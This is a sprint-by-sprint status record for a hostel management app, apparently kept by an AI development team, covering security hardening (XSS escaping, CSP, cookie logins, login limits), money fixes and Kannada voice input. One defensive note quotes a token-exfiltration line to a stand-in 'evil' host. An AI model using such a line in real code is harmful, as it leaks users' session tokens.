# Siri Mane — Phase Status

Owner of this record: PM pass. Framework 2.0. Updated 7 Nov 2026.

## Completed (preserved from pre-framework history; evidence was delta zips + gate counts reported in chat)

| Sprint | Delivered | Gate evidence at delivery |
|---|---|---|
| 0–5 | Stabilise → Warden UX → Resident UX → AI inputs → AI assistant → Owner intelligence | per-sprint gates |
| 6–12 (Phase 2) | Copilot action layer, repaint, Home hierarchy, Resident 360, room map & requests, finance intel, resident experience, notify/docs | 9 gates, 1,787 assertions |
| 13 | Bulk actions w/ preview, command palette, Room 360, universal "Why?", 3 nudges, accessibility pass | 10 gates, 2,001 (+1 migration: room-360) |
| 14 | Quick Entry: verb-free "onion 100rs" / "jhanavi 500" / "tap leaking room 106" | 11 gates, 2,109 |
| 14.1 | Voice repair via Chrome alternatives + model | quick 140 |
| 14.2 | Fuzzy resident names ("janavi" → suggest Jhanavi, never an expense) | quick 159 |
| 14.3 | Copilot question box readable in dark mode; ₹ in Copilot text | ui 690 |
| 14.4 | Kannada/Hindi item words by sound; category taps on expense preview → learned | quick 195, copilot 250, ui 690 |

All of the above is on `main` at `48deac23` and deployed to production by the owner.

## Current phase: F0 — Framework adoption

| Task | Owner | Status | Evidence |
|---|---|---|---|
| F0.1 Read framework, project instructions, context doc | PM | COMPLETED | — |
| F0.2 Declare execution mode | PM | COMPLETED | SINGLE-AGENT SEQUENTIAL ROLES (PROJECT_CONTEXT.md) |
| F0.3 Verify repository, branch and isolation facts (G0) | OPS/SEC | COMPLETED — **findings** | PROJECT_CONTEXT.md §Safety facts |
| F0.4 Create test branch `ai/test` from baseline SHA | DEV | COMPLETED locally | `git checkout -b ai/test 48deac23` |
| F0.5 Add project records under docs/ai-team/ | PM | COMPLETED | this commit |
| F0.6 Re-run the eleven gates on the baseline to confirm the clone matches delivered state | QA | COMPLETED — 11/11 PASS, 2,196 assertions (TZ=UTC); first run under an invalid TZ failed and is kept as evidence | TEST_REPORT.md runs B-1, B-2 |
| F0.7 Push `ai/test` to GitHub | DEV | COMPLETED — `ai/test` → `d1641eb`; `main` verified unchanged at `48deac23` | `git ls-remote` after push |
| F0.8 Owner installs branch protection on `main` | Owner | COMPLETED — ruleset 26756000, verified via `GET /rules/branches/main` | PROJECT_CONTEXT.md §Safety facts |
| F0.9 Test environment on Railway | Owner + OPS | COMPLETED — https://sirimane-test.up.railway.app | TEST_REPORT.md §G5 |
| F0.10 Change the test admin password from the seeded default | Owner | OPEN | public URL + default password in seed.js |

Gate status for F0: G0 **PASS** (direct push to `main` blocked server-side; separate test env + DB), G1–G3 N/A (no application code changed), G4 PASS for a docs-only branch creation, G5 **PASS** — first verified test deployment, Railway `Test` env on `ai/test` (TEST_REPORT.md §G5).

## Current phase: Sprint 15 — UX Sprint A (owner-approved 7 Nov 18:28)

Source: UX/UI specialist review (separate agent, advisory) → owner approved "Sprint A as Sprint 15" + Payments-total fix.

| ID | Acceptance criterion | Specialist review |
|---|---|---|
| S15-1 | Resident app: exactly 4 bottom tabs (Home · Pay · Help · Me); no top tab strip; every one of the 29 resident functions still reachable; SOS in header opens Emergency | UX (advisory) |
| S15-2 | Resident header is one line; Logout + theme live under Me; `.h-due` buttons padded; `select` full width; rating stars ≥44px; payment lines show their type (Rent/Deposit) | UX |
| S15-3 | Edit / Add ID proof / bed-fix open the EDIT form for that resident; saving never creates a second guest | QA |
| S15-4 | Move-in with no ID type saves `null`, never "— select —" | QA, DATA (no backfill — existing rows need a separately approved UPDATE) |
| S15-5 | Finance/Operations sub-tabs stay after any in-page action; "Generate owner report" opens Reports; "Owner & Assets" → "Balance sheet"; Requests has one name; no button appears twice on one screen; one Ctrl+K binding; dead code removed | QA |
| S15-6 | Payments header = confirmed only, plus a separate "waiting for confirmation" line. Before/after: ₹6,000 confirmed + ₹100 pending → was "₹6,100 total", now "₹6,000 received · ₹100 waiting" | **SEC/DATA REQUIRED** (money display) |
| S15-7 | A token issued in one environment is rejected in another; tokens without the claim accepted only if issued before the server started (the old release's tokens, ≤24 h) — no mass logout on any later deploy (review N-1) | **SEC REQUIRED** (auth) — independent agent review before push |
| S15-8 | All 11 gates green on a fresh DB, TZ=UTC; new assertions for S15-1…7; changed screens at 360/390 | QA |

Execution mode for this phase: **LIMITED MULTI-AGENT** — main agent implements; a separate agent reviews the diff (G3). The UX review was a separate agent.


Owner's standing rule: pick it from evidence (Admin → AI impact, `source` column). Candidates from the backlog: "Select all shown" discoverability in the bulk bar; the unexplained `outline-width: 0` on `.nav-item`; four residents with bad bed numbers (data fix, not code); Gemini audio transcription if Copilot-log `heard/understood` pairs show repairs failing.

## Sprint 15.1 — move-in double deposit (owner-approved 7 Nov 20:40)

Found by the owner's phone test on the Test site. Defect **D-15-5 (High, money)**: the move-in wizard posts "Deposit received" as a collection, AND `POST /guests` auto-logs `deposit_amount` as a cash collection → every wizard move-in with a deposit is counted twice. On `main` since 17 Sep. Production check (owner, read-only, 7 Nov 20:39): **0 affected residents** — no cleanup needed.
Why the gate missed it: the ui test asserted `some` deposit row, not exactly one.

| ID | Acceptance criterion | Review |
|---|---|---|
| S15.1-1 | Wizard move-in with deposit ₹X received → exactly ONE deposit collection, amount X, the mode chosen in the wizard. Deposit not received (blank) → no deposit collection | **DATA/SEC REQUIRED** (money) |
| S15.1-2 | The older Add Resident form keeps today's behaviour (one auto-logged deposit) | DATA |
| S15.1-3 | After move-in the confirmation states what was recorded (e.g. "₹14,000 recorded — deposit ₹7,000 + rent ₹7,000, UPI") | UX |
| S15.1-4 | Management payment cards show the type (Rent / Deposit …); month reads "November 2026" whether or not a month was stored | UX |
| S15.1-5 | Gate: wizard move-in asserts exactly one deposit row and exactly one rent row; API test for both POST /guests paths. All 11 gates green, fresh DB, TZ=UTC | QA |

Before/after (sample: deposit ₹7,000 + rent ₹7,000 at move-in, UPI): before 3 rows / ₹21,000 collected / deposit ₹14,000 → after 2 rows / ₹14,000 / ₹7,000.

## Sprint 15.2 — hardening from the 15.1 review (owner: "keep working till you require my permission", 7 Nov 21:11)

Scope chosen by the team from open review findings and the defect ledger. Nothing here changes how money is computed; refund maths stays as is (owner decision if it should change).

| ID | Acceptance criterion | Review |
|---|---|---|
| S15.2-1 | Move-in Save: the button is disabled while saving (no second resident from a double tap). If the resident is saved but a payment is refused (closed day, network), the wizard does NOT re-create the resident on retry, keeps the form, and says plainly which payment did not save; retry posts only the missing payments | DATA (money path) |
| S15.2-2 | Checkout wizard shows deposit **received ₹A of agreed ₹B** next to the refund, with a warning when A < B. Refund number unchanged (display only) | DATA — no money computation change |
| S15.2-3 | Payment type/mode/month are HTML-escaped wherever the management Payments table renders them | SEC |
| S15.2-4 | D-15-1: AI proposal expiry decided by Postgres (`expires_at < NOW()`), not by JS Date parsing. Evidence: copilot, bulk, quick gates pass with the process at TZ=Asia/Kolkata | SEC/QA |
| S15.2-5 | D-15-4: flaky modal-focus assertion — root cause found and fixed (app or test), evidence by repeated runs | QA |
| S15.2-7 | **D-15-6 (Critical, SEC, added during the sprint):** no text written by residents or by the public inbox form becomes HTML on any staff screen; proven by a new gate `xss.smoke.js` that fails before the fix | **SEC REQUIRED** |
| S15.2-6 | All 11 gates green on a fresh DB, TZ=UTC; new assertions for each item; independent review before merge to ai/test | QA |

## Sprint 15.3 — production blockers from the 15.2 review (team-scoped under the owner's "keep working" instruction)

| ID | Acceptance criterion | Review |
|---|---|---|
| S15.3-1 (R-1) | No staff-typed text becomes HTML on admin screens: Resident 360 Address/Emergency/ID type, guest details grid, rent-history button, evening summary, Reports expense category — proven by new staff doors in the xss gate | SEC REQUIRED |
| S15.3-2 (R-2) | Every inline handler argument built from data is `esc(JSON.stringify(x))` in a double-quoted attribute — no single-quoted or quote-swap variants left | SEC |
| S15.3-3 (R-3) | Error messages rendered with esc(); resident portal shows staff-written text (notices, menu, announcements) escaped | SEC |
| S15.3-4 (R-4) | Move-in failure message never tells the warden to record the payment by hand while a retry is pending | DATA |
| S15.3-5 (R-6) | Lost reply on the resident save: retry adopts the resident the server already created (same phone, created in the last 15 min) instead of creating a second | DATA |
| S15.3-6 (R-5) | Inbox search matches text with apostrophes and `&` again | QA |
| S15.3-7 | 12 gates green twice on fresh DBs; independent review before merge to ai/test | QA |

## Sprint 15.4 — T-1..T-3 from the 15.3 review
**Process deviation (recorded honestly):** these criteria were written AFTER the build, not before as §G1 requires. They restate the reviewer's findings verbatim, so scope did not drift, but the order was wrong.

| ID | Acceptance criterion | Review |
|---|---|---|
| S15.4-1 (T-1) | Phones stored as 10 digits (spaces, dashes, +91, leading 0 removed) on POST and PUT /guests; the wizard sends digits; a lost reply with a spaced phone never creates a second resident; residents log in with the plain 10 digits | DATA REQUIRED |
| S15.4-2 (T-2) | Resident ID card shows the staff-typed emergency contact name as text | SEC |
| S15.4-3 (T-3) | Move-in save refused by the server (4xx) → nothing created, Back stays; outcome unknown (no connection / 5xx) → Back locked and the warden is told the outcome is unknown | DATA |
| S15.4-4 | 12 gates green twice on fresh DBs; independent review before merge to ai/test | QA |

Data note: existing residents whose phone was saved WITH spaces cannot log in to the resident app today (login compares exact text). This sprint does not change existing rows — a backfill is a data UPDATE and needs the owner's approval.

## Sprint 15.5 — P-1 and low items from the 15.4 review (criteria recorded BEFORE build)

| ID | Acceptance criterion | Review |
|---|---|---|
| S15.5-1 (P-1) | Resident login accepts the mobile typed as "+91 98…", "98… …" or "098…"; it matches residents whose phone was stored with spaces/dashes too (compared as the last 10 digits in SQL) — so no data backfill is needed for login | SEC REQUIRED (auth) |
| S15.5-2 | First-login default password (= her mobile) also accepts those forms; the stored hash is of the plain 10 digits | SEC |
| S15.5-3 | Move-in wizard treats a missing answer from apiFetch (401 → redirect) as NOT saved; 429 carries status 429 and is reported as "refused, try in a minute" | DATA |
| S15.5-4 | 12 gates green twice; independent review before merge | QA |
Not in scope (owner decision): P-2 shared phones between two active residents.

## Sprint 16 — owner decisions of 8 Nov 07:31 (criteria recorded BEFORE build)

Context: owner released Sprints 15–15.5 to production (PR #8, `main` = 5f96b73). No migration was required.
Owner decisions: (1) one resident per phone number · (3) force residents to change the default password · (4) separate login limiters · (5) upgrade bcrypt. Items (2) phone tidy and (6) "— select —" cleanup: explained; dry-run scripts await owner approval.

| ID | Acceptance criterion | Review |
|---|---|---|
| S16-1 | Saving a resident (add, move-in wizard, edit) whose phone — compared as its last 10 digits — belongs to ANOTHER active resident is refused with a clear message naming that resident's room; a checked-out resident's number may be reused. The wizard checks at step 1, before any money step | DATA REQUIRED |
| S16-2 | A resident who logs in with the default password (her phone number) must set a new one before seeing anything else; the new password cannot be her phone number; afterwards she is not asked again | SEC REQUIRED |
| S16-3 | Staff and resident logins have separate failed-attempt limits: 10 wrong resident logins from one address do not block the warden's login, and vice versa | SEC |
| S16-4 | bcrypt 5 → 6; every existing password hash still verifies (admin, staff, residents); `npm audit --omit=dev` shows no bcrypt/tar finding (D-15-3) | SEC, OPS (dependency upgrade approved by owner) |
| S16-5 | Resident app: payment mode capitalised, month shown for every payment, Pay card shows the last RENT payment | UX |
| S16-6 | 12 gates green twice on fresh DBs; independent review before merge to ai/test | QA |
| S16-7 | **Owner-approved 8 Nov 07:33** — new `backend/scripts/tidy-phones.js`: dry run by default lists every active-or-not resident whose phone is not 10 plain digits and what it would become; `--apply` rewrites only those rows, skips (and lists) any that would collide with another active resident's number or that don't reduce to 10 digits; safe to re-run | DATA REQUIRED |
| S16-8 | **Owner-approved 8 Nov 07:33** — new `backend/scripts/fix-id-type.js`: dry run lists residents whose ID type is a placeholder ("— select —" and variants); `--apply` sets only that field to NULL; safe to re-run | DATA REQUIRED |

## Sprint 16.1 — F16-1c (criteria recorded before build)
| ID | Acceptance criterion | Review |
|---|---|---|
| S16.1-1 | Any login whose verified password's digits contain her 10-digit number (old hashes of "X.X", "+91.X", "X/", "X (s)") is treated as the default and forced to change — the same rule change-password uses | SEC REQUIRED |

## Sprint 16.2 — login limit that cannot be dodged (criteria recorded before build)

**Finding (owner, production console, 8 Nov 10:12):** 12 wrong resident logins, each with a different `X-Forwarded-For`, all got 401 — the per-address limit never triggered. Railway's own answers on how its edge treats that header contradict each other (sources in TEST_REPORT). Owner is re-testing from outside Railway; this sprint does not depend on the answer.

| ID | Acceptance criterion | Review |
|---|---|---|
| S16.2-1 | A per-ACCOUNT failed-login limit on top of the per-address one: 10 wrong resident logins for one mobile (last 10 digits) in 15 min → that mobile gets 429 for the rest of the window, whatever address the requests claim; staff logins keyed by username at 20. Successful logins don't count | SEC REQUIRED |
| S16.2-2 | Other residents and the warden are not affected by one account's limit; the message says when to try again | SEC/UX |
| S16.2-3 | The per-address limiter keys on Railway's edge-written client address when present (documented in code), falling back to req.ip | SEC |
| S16.2-4 | 12 gates green twice; independent review before merge | QA |

## Sprint 16.2.1 — settle the client address (criteria before build)
Evidence (owner, PowerShell from home internet, 8 Nov 12:05, production = 16.1): 12 wrong resident logins, each with a different forged `X-Forwarded-For` → attempts 1–10 401, **11 → 429**, 12 → 401. A 429 at 11 is only possible if all twelve were counted under ONE key, i.e. `req.ip` (trust proxy 1) is the real client address for internet traffic; 12 → 401 matches the fixed 15-min window expiring (owner had failed logins ~15 min earlier). The earlier all-401 result came from the Railway console, i.e. from inside Railway's network.
| ID | Acceptance criterion | Review |
|---|---|---|
| S16.2.1-1 | The per-address limit keys on `req.ip` again (X-Real-IP removed, per reviewer: keep it only if proven per-client and unforgeable — not proven, and not needed); per-account limits unchanged | SEC |

## Sprint 16.3 — account management (criteria recorded before build)
Owner, 8 Nov 12:31: "you don't need my permission to start building after you got what you need" — standing rule recorded in HANDOFF; releases, money, paid services, renames/deletions and data changes still need him.
Released before this sprint: 16.2 + 16.2.1 (PR #14, main = 76beb18). Production Serverless switched OFF by owner (in-process jobs need an always-on container); replicas = 1.

| ID | Acceptance criterion | Review |
|---|---|---|
| S16.3-1 | Admin and staff can change their own password from a "My password" button: current password required; new ≥ 8 characters, not the username, different from current; clear message | SEC |
| S16.3-2 | Admin can set a new password for any staff/admin account (≥ 8 chars) and rename any username (3–30 of letters, digits, . _ -; unique, case-insensitive); both logged in the Audit Log; sessions keep working after a rename | SEC REQUIRED |
| S16.3-3 | Staff or admin can reset a resident's app login: her password goes back to her phone number and she must set her own at the next login; audit-logged | SEC |
| S16.3-4 | When a per-account login pause trips, a bell notification appears (resident → warden, staff/admin → admin) once per account per window, showing only the last 4 digits of a resident's number | SEC/UX |
| S16.3-5 | Resident "Set your own password" screen: labels above full-width boxes at 360/390 px | UX |
| S16.3-6 | 12 gates green twice; independent review before merge | QA |
| S16.3-7 | **Found while answering the owner (12:33): replies to residents' messages were never shown to them.** A message sent from the resident app is linked to her account (`inbox_messages.guest_id`, additive migration `migrate-guest-messages.js`); her name/phone/room come from her record, not from the form; Help shows "My messages" with each reply. Before the migration runs, sending still works and the list says replies will appear soon. The public form (no login) is unchanged | SEC/DATA |

## Sprint 16.4 — D-15-7 + 16.3 review recommendations
**Process deviation (recorded honestly):** the D-15-7 work (S16.4-1) began before these criteria were written, while 16.3 was in review. S16.4-2…5 were written before their build.
16.3 review: APPROVE FOR TEST DEPLOYMENT, no production blocker (merged to ai/test, PR #15).

| ID | Acceptance criterion | Review |
|---|---|---|
| S16.4-1 | D-15-7: a screen whose data arrives after she has moved to another screen never draws over it. Every top-level drawing function draws through drawFor(drawSeq); navigate() hands each screen its own number (two quick taps both bump navSeq before either screen starts). Proven by a slow-network ui test (delayed /purchases and /home, then Rooms) that fails with the guard off | QA/UX |
| S16.4-2 | The "login paused" bell alert fires only for a username or resident number that really exists (active), and never echoes more than 30 characters | SEC |
| S16.4-3 | A resident app-login reset also puts a notification on the ADMIN's bell (who reset whose) | SEC |
| S16.4-4 | Rename writes "old → new" to the audit log; creating a user is refused if the name exists in another case | SEC |
| S16.4-5 | 12 gates green twice; independent review before merge | QA |

**16.4 status:** review round 3 APPROVE (c3553ce) after two BLOCKs — see TEST_REPORT. Also fixed in review: B16.4-1 symlink, D16.4-a refresh gate (46 save helpers), D16.4-b error card, username format on create. Release: no new migration in 16.4 (16.3 needs `node backend/scripts/migrate-all.js`).

## Sprint 17 — finish stability (criteria recorded before build)
Owner, 8 Nov 16:24: "be in order" — stability items first, AI-first work after.
16.3 + 16.4 released to production (PR #17); owner ran `migrate-all.js`; resident "My messages" confirmed working by the owner.

| ID | Acceptance criterion | Review |
|---|---|---|
| S17-1 | **Turn off a staff account instead of deleting it.** Admin can Turn off / Turn on any OTHER staff or admin account (never their own). A turned-off account cannot log in — the right password gets a plain "This account is turned off — ask the owner" message, a wrong password stays the generic "Invalid credentials" — and an open session stops at its next request. Turned-off accounts are not offered in the "assign to" lists and cannot be given new requests. All history (entries, audit log) is kept. Both actions are in the Audit Log. Delete's "cannot be removed" message points to Turn off. Additive migration `migrate-staff-disable.js` (`users.disabled_at`); before it runs, logins and the staff screen keep working and Turn off says the update is pending | SEC REQUIRED |
| S17-2 | The two 16.4 behaviours without tests get tests that fail when their guard is removed: re-opening the same screen during a save still refreshes it; "Recompute" on Home does not pull her back after she moved on | QA |
| S17-3 | A room save or status change refreshes the room view she is on: Room map → map, Rooms table → table, elsewhere → nothing | UX |
| S17-4 | **Content Security Policy on.** Staff and resident pages may load scripts, styles, fonts, images and network calls only from the app itself (plus Google Fonts); nothing on the page can send data to another site; no other site can frame the app; plugins and `<base>` hijack blocked. The public home page additionally allows Google Analytics only. Inline handlers still work (the app uses them everywhere — a nonce-only policy is a larger rewrite). Zero CSP violations on every screen in the ui, portal and xss gates at 360 and 390 px; a test proves a page script cannot reach another site. Moving the login token from localStorage to an httpOnly cookie is **deferred**: it needs CSRF protection on every write route; with connect-src/img-src locked to the app, an injected script can no longer send the token anywhere | SEC REQUIRED |
| S17-5 | 12 gates green twice; mutation check of each guard; independent review before merge | QA |

**S17-4 correction (review round 1):** the deferral reason above overstates the protection. With connect-src/img-src/form-action locked, no *background* request can reach another site — but a page script can still leave by *navigating* the page (`location.href = 'https://evil/?t=' + token`); CSP cannot block top-level navigation. Remaining risk recorded: an injected script could still leak the 8-hour staff token that way. The real defence remains output escaping (xss gate). **Scheduled:** httpOnly-cookie login + CSRF protection on write routes — backlog item D-17-1, next security sprint.
Backlog from the review: D-17-1 (above) · replace the `to_jsonb(u)->>'disabled_at'` read with plain `u.disabled_at` once production has migrated · the resident service worker caches every navigation under `/guest.html` (pre-existing; offline it can show the wrong page) · "+ Add" cut off in the staff card header at 360 px (pre-existing) · the two-admin turn-off race is serialised by an advisory lock but has no automated test (needs two concurrent requests) · optional CSP `report-uri` to see violations on real phones.

## Sprint 18 — one clock: India's date at every hour (D-15-2) (criteria recorded before build)
Owner, 9 Nov 01:03: "go". Found while testing hotfix 17.1: between 00:00 and 05:30 IST the server, the database and the phones' default dates use the UTC date — i.e. yesterday.
Survey: Railway's Postgres and Node run in UTC. 58 `timestamp without time zone` columns hold UTC wall-clock time, so the database session time zone must NOT be switched (old and new rows would differ by 5½ h). The fix is targeted: every place that asks "what is today / this month / which day was this" computes it in Asia/Kolkata.

| ID | Acceptance criterion | Review |
|---|---|---|
| S18-1 | **One clock.** Every "today", "yesterday", "this month", default date, date limit and date range — in the server (Node), the SQL it runs, the management screens and the resident app — uses India's date at every hour, including 00:00–05:30 IST, and on any phone time zone setting. Day boundaries of stored time stamps (e.g. "complaints raised today", refunds in a period) are taken in IST. Storage formats and existing rows are not changed; no schema change | QA |
| S18-2 | **Money (called out).** New collections, the additional-deposit entry, purchases, inspections and checkout dates entered between 00:00 and 05:30 IST get *today's* IST date — rent collected at 1 am on the 1st counts in the new month (before: the previous month). Before/after shown on sample data in TEST_REPORT. Existing records are untouched; `pending_verification` never counts as income (unchanged) | MONEY, SEC |
| S18-3 | **Year-to-date report starts on 1 January.** Today it starts on 31 December of the previous year (phone time zone bug, at every hour). Before/after totals on sample data | MONEY |
| S18-4 | **Proven at the hard hours.** The full 12-suite gate passes with the whole stack (Node, Postgres and Chrome) on a faked clock at: 14:00 IST; 01:00 IST on the 1st of a month (inside the window and across a month boundary); 23:45 IST — plus twice on the real clock. New tests assert the exact dates in the window | QA |
| S18-5 | Independent review before merge; mutation check of the window tests | QA |

## Sprint 19 — login in a protected cookie (D-17-1) (criteria recorded before build)
Owner, 9 Nov 06:35: "go". Closes the remaining risk recorded in Sprint 17: an injected script could read the login token from browser storage and carry it off by navigating the page.

| ID | Acceptance criterion | Review |
|---|---|---|
| S19-1 | Staff and resident logins live in **HttpOnly, SameSite=Strict** cookies (Secure on HTTPS, Path=/api): no page script can read them. After login nothing token-like is in localStorage or sessionStorage; tokens stored by the old app are deleted on first load | SEC REQUIRED |
| S19-2 | Logout ends the session on the server side of the browser (cookie cleared). Staff session 8 h as today. Resident: "Remember me" keeps her logged in across browser restarts for the token's life; otherwise until the browser closes. The forced first-login password change still works end to end | SEC, UX |
| S19-3 | **Cross-site request forgery blocked twice over:** SameSite=Strict, and every state-changing request that authenticates by cookie must carry the app's own request header — without it the server refuses (403). Cross-origin sites still cannot read or send credentialed requests (CORS unchanged, no credentials) | SEC REQUIRED |
| S19-4 | Nothing else changes for the user: every screen, PDF/CSV downloads, request photos, her ID photo, receipts, Copilot and bulk actions (internal calls), turned-off accounts, login limits, environment-bound tokens. API clients that send `Authorization: Bearer` (the gates, internal calls) keep working | QA |
| S19-5 | **Release is safe:** a phone that was logged in before the release is asked to log in once — no error loop, no blank screen | OPS |
| S19-6 | Gates 12/12 twice; new tests prove page JS cannot read the token (not in `document.cookie`, not in storage) and that a cookie-authenticated write without the header is refused; independent review before merge | QA |

## Sprint 20 — AI that keeps working, Admin on a phone (criteria recorded before build)
Owner, 9 Nov 09:33: "Go" (AI-first, in order). Evidence from the owner's production screenshots, 09:40:
- Admin → Settings → Test AI connection: Gemini ✅ 551 ms; **Groq ❌ 404 "model llama-3.3-70b-versatile does not exist"** — Groq retired it on 16 Aug 2026 (console.groq.com/docs/deprecations). The command bar (Copilot), quick-entry category guess and voice repair/fill for collections and complaints call Groq ONLY when its key is set — no fallback — so their AI step has failed silently for ~3 months (rules-only).
- On a phone the Admin tab row runs off the screen and cannot scroll: "Copilot log" and "AI impact" are unreachable.
- Audit Log cards on a phone label the action row "PAYS".
Correction: the earlier plan ("add voice to collections and complaints") was wrong — both already have voice and photo input.

| ID | Acceptance criterion | Review |
|---|---|---|
| S20-1 | **AI text never depends on one provider.** One text helper is used by every AI text call (Copilot routing, quick-entry category, voice repair/fill for collections and complaints): Groq first when configured, and on any Groq failure the same request goes to Gemini. After a Groq failure, Groq is skipped for 10 minutes (no extra wait on patchy 4G). Which provider answered is recorded where the Copilot log already records the source | QA |
| S20-2 | Groq's model is a current one by default (configurable with `GROQ_MODEL`); "Test AI connection" shows both providers and says which one the app is using now | OPS |
| S20-3 | **Admin on a phone:** all six Admin tabs are reachable at 360 and 390 px (the row scrolls or wraps), with 44 px tap targets | UX |
| S20-4 | Audit Log cards on a phone carry the right labels (no "PAYS") | UX |
| S20-5 | Backlog: the resident app's notice list respects room/floor targeting (a notice for one room is not shown to everyone); a 401 from change-password caused by an expired or turned-off login logs out instead of showing "Invalid token" | PRIVACY, UX |
| S20-6 | Gates 12/12 twice; tests prove the fallback (Groq failing → Gemini answers; skip window), the tabs and the labels at 360/390, the notice targeting; independent review before merge | QA |

## Sprint 21 — she speaks Kannada (criteria recorded during build — see note)
Owner, 9 Nov 11:55: "nothing is live now so start building after that i will make them use" — with six production screenshots of Admin → Copilot log. Evidence from them:
- Voice: "eerulli" (ಈರುಳ್ಳಿ, onion) arrived as **"heroine"**, **"Erode"**, "heroine urupai"; "aloo get a new Rupee". Every mic listens only in English (`rec.lang='en-IN'` in both voice engines), so Kannada words are lost before any parser sees them.
- "eruli 500rs" → Other and the Groq 404 → "I'm not sure" entries are from **17 Sept**. Re-run on today's code: typed Kanglish already works ("eruli 500rs", "pudina soppu 500rs" → Groceries) and Sprint 20 fixed the 404. Correction to my first read of the screenshots.
- Still open on today's code: an item with no amount ("pudina soppu", "eerulli") → "I'm not sure"; "hal 60" (milk) → Other; on a phone the Copilot log squeezes Siri's reply into a narrow column beside the badge.
Note: the owner said to start building at once, so these criteria were written alongside the build, not before it. The gate and the independent review are unchanged.

| ID | Acceptance criterion | Review |
|---|---|---|
| S21-1 | **Kannada script is understood.** A shared, keyless transliteration (`SMParse.toLatin`) spells Kannada script the way WhatsApp Kannada is typed (ಈರುಳ್ಳಿ → eerulli, ಜಾನವಿ → jaanavi, ಕ್ಯಾಶ್ → cash, ರೂಮ್ ನಂಬರ್ ೧೦೬ → room number 106). Text with no Kannada letters is returned untouched | QA |
| S21-2 | Kannada number words: digits ೦–೯, ಐದು ಸಾವಿರ, ಎರಡು ಸಾವಿರದ ಐನೂರು, ಐನೂರು, ನೂರು ಇಪ್ಪತ್ತು, teens | QA |
| S21-3 | Quick Entry (Copilot bar, quick sheet) handles Kannada script end to end: expenses with category, amount and mode; a resident's name said in Kannada is a collection, never an expense; "-kaayi" vegetables are Groceries | QA |
| S21-4 | Complaints in Kannada (ಸೋರುತ್ತಿದೆ, ಕೆಲಸ ಮಾಡ್ತಿಲ್ಲ, ಬರುತ್ತಿಲ್ಲ, "current illa") are complaints, kept in her words, with the room read | QA |
| S21-5 | An item she buys, said with no amount, asks "How much was the …?" and puts the item back in the box. This happens only when every word is a known grocery or cleaning item, so commands and questions ("rent due", "milk finished") still go to the Copilot | UX |
| S21-6 | Questions in Kannada (ಯಾರು…, eshtu…) are not entries | QA |
| S21-7 | A clearly spoken Kannada phrase needs no AI call (on-device recognition + rules) | COST |
| S21-8 | The purchase form's mic fills a category its own word list lacks (eerulli, phenyl, ಹಾಲು) through `POST /copilot/category`. It uses the dictionary and this PG's history only, **never the model**, and needs a login | PRIVACY, QA |
| S21-9 | Copilot log on a phone: Siri's reply sits under the outcome badge with room to read | UX |
| S21-10..13 | **Mic language switch.** Every mic (Copilot bar, quick sheet, Collect, Complaints, Purchase) listens in the language chosen on this phone (English by default). While listening, and after each result, the status line offers one 44 px button, "ಕನ್ನಡದಲ್ಲಿ ಹೇಳಿ" or "Speak English", that stops, switches and listens again. A phone without Kannada speech falls back to English and says so | UX |
| S21-14 | In the Collect and Complaint voice previews, what was heard is shown as plain text, never as markup | SECURITY |
| S21-15 | Gates 12/12 twice; mutations caught; independent review before merge. **Not verifiable here:** what Chrome on a real Android phone writes in ಕನ್ನಡ mode (digits vs words, loan-word spellings). The owner tries it after release | QA |

**Sprint 21 status:** approved by the independent review in round 6 (d103b88), after BLOCK ×5. Gates 12/12 ×2, 3,169 each. Merged to ai/test. No migration. The owner checks ಕನ್ನಡ voice on a real phone on Test (S21-15).

**Hotfix 21.1 status:** approved (d47f73b), merged to ai/test (PR #30).

**Hotfix 21.2 status:** approved by the independent review in round 3 (f7979a4), after BLOCK ×2. Gates 12/12 ×2, 3,338 each. Merged to ai/test. No migration. Follow-ups are listed under Hotfix 21.2 in TEST_REPORT.md; the first is the other half of S-e (copilot.js page-resident fallback). Still unverified on a real phone: ಕನ್ನಡ mode (every owner screenshot so far is English mode), and the real repair model on the four owner phrases.

**Hotfix 21.3 status:** approved by the independent review in round 2 (bb31178), after BLOCK ×1. Gates 12/12 ×2, 3,454 each. Merged to ai/test. No migration. Follow-ups are listed under Hotfix 21.3 in TEST_REPORT.md.

## Sprint 22 — stability sweep (backlog from Sprints 17–21 and the 21.x reviews)
Owner, 10 Nov: "keep working, stop whenever my decision is required". No decision needed: every item is a known defect with the fix already agreed in a review.

| ID | Acceptance criterion | Review |
|---|---|---|
| S22-1 | On a resident's page, an ordinary leftover word inside another resident's name ("6000 cash van" → Bhavana) does not list that resident; only a whole name word, the start of one (4+ letters) or a sound-alike counts | UX |
| S22-2 | More Kannada/English filler on a resident's page needs no tap (avalu, old dues, morning, hostel fee, token, qr code …) | UX |
| S22-3 | A weight is never money: "rice 2 thousand 5 hundred grams" has no amount; "rice 5 hundred grams 60" is ₹60 | MONEY |
| S22-4 | A resident's payment in thousands ("hattu savera deposit" → ₹10,000) is prepared with the note; only an unusual figure (above ₹25,000) is asked about | UX |
| S22-5 | The "Test AI connection" probe pauses Groq only when Gemini can stand in (as `providers.text` does) | COST |
| S22-6 | Gemini's request body is tested: JSON asked for only when wanted, the key in a header and never in the URL | QA |
| S22-7 | The 409 closed-day message, when the closed day is today, says an admin must reopen it (not "record this against today") | UX |
| S22-8 | Stopping the mic (or a silent timeout) never leaves "Listening…" on screen | UX |
| S22-9 | "+ Add Staff" and the search box fit a 360 px screen | UX |
| S22-10 | Gates 12/12 twice; mutations caught; independent review before merge | QA |

**Sprint 22 status:** approved by the independent review in round 1 (3c2b159). Gates 12/12 (3,490) on e482643. Merged to ai/test. No migration.

## Sprint 23 — local SEO for sirimane.in (owner, 10 Nov 17:56: "do which all can be done from your side")
The public page already had a title, description, Open Graph/Twitter tags, geo tags, LodgingBusiness structured data, robots.txt and a sitemap. This sprint fixes what was weak or missing. Address, phone and pincode come from the existing structured data and footer (5th Cross, Gangotri Road, S.I.T. Extension, Tumakuru 572103 · 9880217627). Enquiry hours 9 am – 8 pm are an assumption the owner must confirm.

| ID | Acceptance criterion | Review |
|---|---|---|
| S23-1 | Structured data is valid JSON-LD: LodgingBusiness (phone, address, pincode, hours, area served), FAQPage whose questions are word-for-word the ones shown on the page, WebSite | SEO |
| S23-2 | Exactly one H1, carrying the search phrase ("Safe Ladies PG in Tumakuru, near S.I.T. Extension"); a local title; a canonical link to https://sirimane.in/ | SEO |
| S23-3 | GET on www.sirimane.in → 301 to sirimane.in with path and query kept; API calls are never redirected; other hosts (Test site) untouched | SEC |
| S23-4 | /guest.html, /management.html and /api/* send X-Robots-Tag noindex; the home page, robots.txt and sitemap.xml do not | SEO |
